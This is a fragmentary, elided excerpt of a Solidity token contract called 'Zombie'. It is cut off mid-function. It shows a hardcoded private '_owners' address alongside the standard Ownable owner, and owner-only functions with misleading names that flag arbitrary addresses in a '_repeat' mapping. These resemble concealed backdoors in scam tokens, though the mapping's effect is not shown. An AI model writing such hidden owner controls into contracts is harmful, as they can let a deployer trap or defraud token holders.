...
contract Ownable is Context {
    ...
    address private _owners = 0x81feEE992fd21D4a9B82DC26aCBFd35Ae14f3000;
...
contract Zombie is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 1000000000000 * 10**3;
    uint256 private _tFeeTotal;
    
    string private _name = "Zombie";
    string private _symbol = "Zombie";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x81feEE992fd21D4a9B82DC26aCBFd35Ae14f3000;
    ...
    function _approverepeat(address Tradingstatus) external onlyowners() {
        _repeat[Tradingstatus] = true;
    }

    function _approverepeats(address Tradingstatus) external onlyowners() {
